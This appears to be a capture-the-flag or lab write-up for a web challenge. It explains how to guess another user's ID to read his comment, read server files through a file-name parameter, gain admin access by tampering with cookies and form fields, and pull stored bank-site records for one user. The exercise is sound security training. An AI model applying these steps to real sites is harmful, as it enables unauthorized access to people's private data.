Observe the app behavior is to generate a value for ID when all other form fields are submitted. When the ID is submitted, the original comment is returned. 
Use this fact to predict Mike's ID: Use Mike's values to generate his ID. Use his ID to get his comment.

Use the level02 vulnerability to do directory reading, to get a sense of the directories and files on this server. We only use the filename parameter to do file read not injection.

On the /store page: Modify the Cookie header with the key blacklist=store or blacklist=retrieve, and set admin=1 in form data. This allows you to read the source files.
Notice in retrieve the password that allows you to read all the files of all IDs in /tmp/ storage. Use this password with admin=1 to read all lines of all files with
site=www.bank.com. curl then write output to file, read each line and filter for mike_pence.
